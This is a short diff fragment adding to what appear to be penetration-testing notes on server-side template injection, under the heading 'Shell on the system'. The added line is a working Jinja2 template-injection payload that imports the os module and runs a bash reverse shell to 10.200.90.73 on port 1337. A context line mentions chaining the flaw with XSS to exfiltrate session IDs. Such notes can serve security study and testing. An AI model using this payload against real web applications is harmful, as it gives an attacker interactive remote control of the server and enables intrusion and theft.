@@ -157,3 +157,7 @@ When this is chained with something like XSS it can be used to exfil session IDs
 
 # Shell on the system
 
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -i &>/dev/tcp/10.200.90.73/1337 <&1').read() }}
+```
+
